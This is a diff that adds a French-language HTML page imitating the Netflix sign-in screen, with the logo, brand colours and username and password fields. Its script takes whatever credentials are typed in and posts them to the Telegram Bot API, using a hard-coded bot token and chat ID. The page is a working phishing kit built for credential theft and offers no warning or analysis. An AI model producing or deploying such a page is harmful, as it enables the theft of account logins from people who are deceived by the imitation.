@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Connexion à Netflix</title>
+  <style>
+    .container {
+      width: 80%; /* Largeur du conteneur de 80% */
+      margin: auto;
+      text-align: center;
+      padding-top: 50px;
+      color: #000; /* Couleur du texte en noir */
+      border-radius: 10px;
+    }
+
+    #netflix-logo {
+      width: 200px; /* Taille du logo de Netflix */
+      margin-bottom: 20px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 45%; /* Largeur des champs d'entrée */
+      padding: 12px; /* Augmentation de la taille du rembourrage */
+      margin: 10px 10px; /* Espacement entre les champs */
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+      font-size: 18px; /* Taille de police de 18px */
+      display: inline-block; /* Affichage en ligne */
+    }
+
+    button {
+      background-color: #E50914; /* Couleur de fond rouge de Netflix */
+      color: #fff;
+      padding: 12px 24px; /* Augmentation de la taille du rembourrage */
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 18px; /* Taille de police de 18px */
+    }
+
+    button:hover {
+      background-color: #B20710; /* Couleur de fond rouge foncé au survol */
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img id="netflix-logo" src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo">
+    <h2>Connexion à Netflix</h2>
+    <form id="login-form">
+      <input type="text" id="username" name="username" placeholder="Nom d'utilisateur" required>
+      <input type="password" id="password" name="password" placeholder="Mot de passe" required><br>
+      <button id="login-button">Se connecter à Netflix</button>
+    </form>
+  </div>
+
+  <script>
+    // JavaScript pour gérer la connexion à Netflix
+
+    document.getElementById('login-button').addEventListener('click', function() {
+      // Récupérer les valeurs des champs du formulaire
+      var username = document.getElementById('username').value;
+      var password = document.getElementById('password').value;
+
+      // Envoyer les données à votre bot Telegram
+      var message = "Nouvelle connexion à Netflix :\n" +
+                    "Nom d'utilisateur : " + username + "\n" +
+                    "Mot de passe : " + password;
+
+      // Remplacez 'VOTRE_TOKEN' par le Token de votre bot Telegram
+      var botToken = '7005694540:AAGvjtyE48uNeJ0QUrW4_JkHAnpvmEmA-_Y';
+
+      // Remplacez 'VOTRE_ID' par l'ID de votre chat Telegram
+      var chatId = '6526742520';
+
+      // URL de l'API Telegram pour envoyer un message
+      var apiUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
+
+      // Créer une requête HTTP POST pour envoyer le message à votre bot Telegram
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', apiUrl, true);
+      xhr.setRequestHeader('Content-Type', 'application/json');
+
+      xhr.onreadystatechange = function () {
+        if (xhr.readyState === 4 && xhr.status === 200) {
+          console.log('LA CONNEXION EST ENVOYÉ VERS VOTRE COMPTE NETFLIX VEILLEZ VÉRIFIER !');
+        }
+      };
+
+      var data = JSON.stringify({
+        chat_id: chatId,
+        text: message
+      });
+
+      // Envoyer les données
+      xhr.send(data);
+    });
+  </script>
+</body>
+</html>
